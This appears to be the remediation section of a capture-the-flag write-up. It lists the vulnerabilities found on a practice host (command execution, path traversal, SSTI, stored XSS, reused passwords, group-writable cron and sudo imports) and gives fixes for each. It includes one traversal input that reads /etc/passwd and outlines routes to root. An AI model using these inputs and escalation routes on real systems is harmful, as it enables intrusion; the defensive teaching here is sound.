- **`/api/debug?cmd=` command execution.** Delete the endpoint. `os.popen(user_input)` has no safe form, and a hardcoded token is not authentication.
- **`/api/debug?file=` path traversal.** `os.path.join(APP_ROOT, user_input)` lets `?file=../../etc/passwd` escape the root. Remove it, or resolve the real path and assert it stays inside an allowlisted directory before opening.
- **SSTI on `/evaluate`.** Never build a template out of user input (`render_template_string("... " + name)`). Render a static template and pass the value as an escaped variable. Drop the `X-Debug-Render` behaviour and the `/static/js/debug.js` that advertises it.
- **Stored XSS on `/appeal`.** `{{ appeal.reason|safe }}` renders attacker HTML verbatim. Remove `|safe` so Jinja autoescapes, add a Content-Security-Policy, and treat the `/api/ingest` reflect-and-store pair as an exfil channel that should not exist.
- **Information leaks.** `robots.txt` listing live paths, the `/beta/evaluate` traceback dumping internal paths, and `/api/internal/schema` naming the backend all hand over the map. Strip debug routes and verbose errors in production.

### credentials and keys

- **Leftover `.env.old` with a live, reused password.** Delete stray dotenv files, rotate the password, and never reuse a deploy password as a shell or SSH password. Prefer keys with `PasswordAuthentication no`.
- **Another user's private key left on disk.** `id_rsa_sophie.enc` sitting in wil's home, protected by `iloveyou`, is one crack away from account takeover. Do not store other people's keys; if a key must exist, give it a strong passphrase and rotate it once the host is shared.
- **Password in shell history.** The board PDF password is sitting in sophie's `.bash_history`. Do not pass secrets on the command line, and scrub history for anything that leaked.

### services

- **`DEBUG:` backdoor on `hal9042d:7042`.** Remove the debug command handler from the daemon. If a maintenance channel is genuinely needed, authenticate it and never let it exec input. Binding to loopback is not a control when the web tier already runs on loopback.
- **Unauthenticated services that return secrets.** The telemetry endpoint (`:9000`) and the whisper channel (UDP `1337`) both hand a flag to anyone who asks, and whisper is bound to `0.0.0.0`. Require authentication, bind internal services to loopback, and stop treating "internal" as a trust boundary.
- **Secret in a non-httpOnly cookie.** The reviewer bot carries its flag in a JS-readable cookie, which is what makes the XSS pay off. Mark session cookies `HttpOnly`, `Secure`, and `SameSite`, and never put a secret in a cookie at all.
- **Secret embedded in a binary.** `xbackup` carries `FLAG{...}` in its `.rodata`, recoverable with `strings`. Do not compile secrets into binaries.

### privilege escalation

- **Group-writable cron target.** `check.sh` is owned by ol but writable by `evalops`, and it runs as ol every 5 minutes. A cron target must be writable only by its owner (`0700`), inside a directory a lower-privileged group cannot modify.
- **Weak crypto on the sealed report.** AES-256 in ECB mode leaks block structure and has no integrity. Use an authenticated mode (AES-GCM) with a random nonce, and derive the key with a real KDF from a real secret, not four short guessable fragments.
- **`sudo` script importing from a group-writable directory.** `sys.path.insert(0, "/opt/hal9042/lib")` plus a `hal9042`-writable lib (and a group-writable `moulai_utils.py`) is a straight module hijack to root. Everything on a privileged script's import path must be root-owned and non-group-writable. Use absolute imports from a trusted location, and drop `NOPASSWD` or lock the command down in sudoers. Never let a lower-privileged user edit code that later runs as root.
- **Secrets in `EnvironmentFile` / process environment.** Anything in `/proc/<pid>/environ` is readable by root and by the process owner, which is how the daemon flag leaks. Do not pass secrets as environment variables; use systemd `LoadCredential=` / `SetCredential=` or a tightly-permissioned file read at startup.

### hygiene

- **Deleted users leave traces.** Xavier's home, backups, and `/tmp` stash survived his account deletion. Offboarding must purge or archive a user's files, not just remove the account, and orphaned uids should be reaped.
- **Provisioning backdoors.** The dormant `fortytwo` account with an old sudo rule exists only because provisioning tooling left it behind. Remove setup accounts and their sudo rules after install.
- **The decoy and traps are not vulnerabilities**, they are noise, but they carry the lesson: every real flag here is one committed secret, one debug feature left on, one reused password, one group-writable privileged file, or one secret in the wrong place. Fix the class, not the instance, and the whole chain collapses.
